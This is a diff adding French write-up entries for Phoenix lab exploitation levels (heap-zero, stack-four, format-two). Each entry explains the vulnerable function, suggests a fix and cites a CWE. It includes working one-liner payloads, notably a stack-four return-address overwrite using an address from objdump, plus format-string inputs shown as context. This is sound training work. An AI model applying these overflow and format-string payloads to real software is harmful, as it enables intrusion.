@@ -123,3 +123,45 @@ python3 -c 'print("%33x")' |./format-zero
 
 python3 -c 'print("%31x"+","+"lOvE")' |./format-one
 pas plus que 15 caractères donc pas de \x... etc on repart sur codage asci
+
+**heap-zero**
+
+En analysant le code source, on observe l’utilisation de la fonction strcpy() pour copier l’argument passé en ligne de commande dans un buffer de taille fixe situé sur le heap.
+Aucune vérification de taille n’est effectuée, ce qui permet un dépassement sur le tas lorsque l’argument dépasse 64 octets. Les structures sont allouées consécutivement donc le débordement peut écraser le pointeur de fonction f->fp entrainant un détournement du flot d'exécution lors de l'appel.
+
+Pour corriger cette erreur on peut remplacer strcpy() en strncpy() qui vérifie la  taille de l'entrée avant sa la copie.
+
+CWE-122 : A heap overflow condition is a buffer overflow, where the buffer that can be overwritten is allocated in the heap portion of memory, generally meaning that the buffer was allocated using a routine such as malloc().
+
+**stack-four**
+Le programme lit une entrée utilisateur à l’aide de la fonction gets() dans un buffer de taille fixe situé sur la pile :
+La fonction gets() ne vérifie pas la taille de l’entrée fournie donc on peut écrire plus que 64 octets et donc écraser l'adresse de retour de start_level().
+
+On réitère donc le même protocole à chaque fois (car on connait le code sourcce):
+
+ensea@Security2:/opt/phoenix/amd64$ objdump -t /opt/phoenix/amd64/stack-four | grep complete_level
+000000000040061d g     F .text	0000000000000018 complete_level
+
+Donc ceci permet d'avoir la bonne adresse:
+
+ensea@Security2:/opt/phoenix/amd64$ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*88 + b"\x1d\x06\x40\x00\x00\x00\x00\x00")' | ./stack-four
+
+La faiblesse provient donc de l’utilisation de gets(), qui permet un dépassement de tampon sur la pile et un détournement du flot d’exécution.
+
+Pour corriger cette erreur, il faut remplacer gets() par une fonction limitant la taille de l’entrée, comme fgets()
+
+CWE-121 :  A stack-based buffer overflow condition is a condition where the buffer being overwritten is allocated on the stack (i.e., is a local variable or, rarely, a parameter to a function).
+
+**format-two**
+
+Le programme utilise une entrée utilisateur qui est ensuite passée directement à la fonction printf : "printf(str);"
+La variable globale changeme est stockée en mémoire à une adresse connue:
+ensea@Security2:/opt/phoenix/amd64$ objdump -t /opt/phoenix/amd64/format-two | grep changeme
+0000000000600af0 g     O .bss	0000000000000004 changeme
+La faiblesse provient donc de l’utilisation de printf avec une chaîne contrôlée par l’utilisateur, ce qui ouvre la porte à une vulnérabilité de type format string et permet la modification de données en mémoire.
+
+Pour corriger cette erreur, il faut utiliser une chaîne de format fixe lors de l’appel à printf comme ceci:
+printf("%s", str);
+
+CWE-134 : The product uses a function that accepts a format string as an argument, but the format string originates from an external source
+
